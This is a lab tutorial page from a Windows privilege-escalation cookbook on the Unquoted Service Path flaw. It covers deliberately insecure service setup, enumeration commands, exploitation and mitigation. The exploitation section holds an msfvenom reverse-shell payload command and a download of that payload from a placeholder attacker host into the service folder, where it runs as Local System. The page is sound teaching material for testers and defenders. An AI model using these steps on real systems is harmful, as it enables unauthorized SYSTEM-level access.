# Unquoted Service Path

[Back to Main](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#vulnerabilities)

## Table of Contents

- [Unquoted Service Path](#unquoted-service-path)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

The Unquoted Service Path vulnerability in Windows occurs when services are installed using paths containing spaces without proper quotation marks. If attackers obtain write permissions in the service's installation directory, they can execute malicious code with elevated privileges.

In Windows, when a file path contains spaces and isn't enclosed within quotation marks, the operating system assumes the file's location based on predetermined rules.

This process involves checking potential paths in a sequence similar to the following:

1) C:\Program.exe

2) C:\Program Files\Vulnerable.exe

3) C:\Program Files\Vulnerable Service1\Service.exe

4) C:\Program Files\Vulnerable Service1\Service 1.exe (Finally arriving at the specified path)

## Lab Setup

### Manual Lab Setup

1) Open a PowerShell with local Administrtor Privileges and use the following command to create a new folder:

```
mkdir C:\Program` Files\Vulnerable` Service1
```

2) Download the file [Service 1.exe](/Lab-Setup-Binary/Service%201.exe) to the 'C:\Program Files\Vulnerable Service1' directory.

3) Grant write privileges to BUILTIN\Users for the service folder:

```
icacls "C:\Program Files\Vulnerable Service1" /grant BUILTIN\Users:W
```

4) Install the new Service:

```
New-Service -Name "Vulnerable Service 1" -BinaryPathName "C:\Program Files\Vulnerable Service1\Service 1.exe" -DisplayName "Vuln Service 1" -Description "My Custom Vulnerable Service 1" -StartupType Automatic
```

5) Edit new service's permissions to be controlled by BUILTIN\Users:

```
cmd.exe /c 'sc sdset "Vulnerable Service 1" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;BU)'
```

Outcome:

![Unquoted-Service-Path-Manual-Lab-Setup](/Pictures/Unquoted-Service-Path-Manual-Lab-Setup.png)

6) Verify the new service (services.msc):

![Unquoted-Service-Path-Manual-Lab-Setup-Verify](/Pictures/Unquoted-Service-Path-Manual-Lab-Setup-Verify.png)

7) Manually start the service from the service panel, or reboot the machine due to the service is set to start automatically upon machine boot.

:information_source: If you want to unistall the new service use the following command:

```
Remove-Service -Name "Vulnerable Service 1"
```

### PowerShell Script Lab Setup

To set up the lab with the 'Unquoted Service Path' vulnerability is by using the custom PowerShell script named [UnquotedServicePath.ps1](/Lab-Setup-Scripts/UnquotedServicePath.ps1).

1) Open a PowerShelll with local Administrator privileges and run the script:

```
.\UnquotedServicePath.ps1
```

Outcome:

![Unquoted-Service-Path-Script-Lab-Setup](/Pictures/Unquoted-Service-Path-Script-Lab-Setup.png)

2) Manually start the service from the service panel, or reboot the machine due to the service is set to start automatically upon machine boot.

:information_source: If you want to unistall the new service use the following command:

```
Remove-Service -Name "Vulnerable Service 1"
```

## Enumeration

### Manual Enumeration

1) Open a command prompt and use the following command to find out if there is any service application vulnerable to Unquoted Service Path:

```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

2) Use the following command to find the `START_TYPE`, `SERVICE_START_NAME` and `BINARY_PATH_NAME`:

```
sc qc "Vulnerable Service 1"
```

3) Use icacls to identify the permissions of the service installation folder:

```
icacls "C:\Program Files\Vulnerable Service1"
```

Outcome:

![Unquoted-Service-Manual-Enumeration](/Pictures/Unquoted-Service-Manual-Enumeration.png)

:information_source: Finally, as you can see: 

- There is a vulnerable service named "Vulnerable Service 1".
- The service automatically starts after machine boots.
- The Local System runs the service.
- The BUILTIN\Users can write in C:\Program Files\Vulnerable Service1 folder.

### Tool Enumeration

To run the SharpUp tool and perform an enumeration of the `Unquoted Service Path` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit UnquotedServicePath
```

Outcome:

![Unquoted-Service-Tool-Enumeration](/Pictures/Unquoted-Service-Tool-Enumeration.png)

## Exploitation

To abuse this vulnerability you should follow these steps:

1) Verify the service state:

```
sc query "Vulnerable Service 1"
```

2) Create with msfvenom a malicious exe file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service.exe
```

3) Open a listener in your kali machine.

4) Transfer the malicious executable in "C:\Program Files\Vulnerable Service1\":

```
iwr -Uri http://<ip>:<port>/Service.exe -Outfile "C:\Program Files\Vulnerable Service1\Service.exe"
```

5) Try to find out if you have the permission to restart the service or re-start the machine:

```
sc stop "Vulnerable Service 1"
```

and 

```
sc start "Vulnerable Service 1"
```

Outcome:

![Unquoted-Service-Exploitation](/Pictures/Unquoted-Service-Exploitation.png)

6) Verify the reverse shell on your Kali machine:

![Unquoted-Service-Path-Reverse-Shell](/Pictures/Unquoted-Service-Path-Reverse-Shell.png)

## Mitigation

To defend against Unquoted Service Path vulnerabilities, modify the service configuration to include proper quotation marks around the executable path. Moreover, review the permissions of service installation folder and binary file to prevent unauthorized changes.

## References

- [Introduction to Windows Services applications Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications)
- [Hot to Create Windows Services Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/how-to-create-windows-services)
- [Fix Windows Unquoted Service Path Vulnerability by isgovern](https://isgovern.com/blog/how-to-fix-the-windows-unquoted-service-path-vulnerability/)
- [Unquoted Service Paths by CyberTec](https://kb.cybertecsecurity.com/knowledge/unquoted-service-paths)
- [FixUnquotedPaths GitHub by NetSecJedi](https://github.com/NetSecJedi/FixUnquotedPaths)
